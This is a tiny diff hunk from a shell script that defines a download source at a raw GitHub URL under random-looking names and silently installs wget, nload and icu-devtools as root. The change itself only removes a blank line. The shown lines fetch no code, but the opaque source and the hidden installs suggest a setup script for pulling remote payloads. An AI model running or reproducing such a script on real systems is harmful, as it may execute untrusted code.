@@ -3,7 +3,6 @@
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
 
-
 # Debian12+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
